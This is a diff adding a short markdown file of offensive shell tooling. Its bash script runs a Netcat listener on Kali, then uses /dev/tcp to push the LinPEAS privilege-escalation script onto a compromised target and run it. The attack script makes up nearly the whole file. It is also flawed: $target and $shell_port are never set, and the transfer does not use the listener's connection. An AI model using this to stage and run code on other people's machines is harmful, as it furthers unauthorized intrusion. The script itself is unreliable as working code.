@@ -1,0 +1,32 @@
+## Shit Scripts
+
+Auto-transfer and Execute LinPEAS for Privilege Escalation
+This is a bash script to listen for an incoming Netcat connection and automatically transfer and execute LinPEAS on the target machine.
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#!/bin/bash
+# Listener setup on Kali
+nc_listener_port=1234
+linpeas_path="/path/to/linpeas.sh"
+
+# Start listener
+nc -lvnp $nc_listener_port | while read line; do
+  echo "$line" | grep -q 'Connection from' && \
+  {
+    echo "Connection received, transferring linpeas.sh..."
+    # Wait for the shell prompt
+    sleep 1
+    # Transfer linpeas.sh
+    cat $linpeas_path > /dev/tcp/$target/$shell_port
+    echo "linpeas.sh transferred. Running linpeas..."
+    # Command to run linpeas on the target
+    echo "bash linpeas.sh" > /dev/tcp/$target/$shell_port
+  }
+done
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
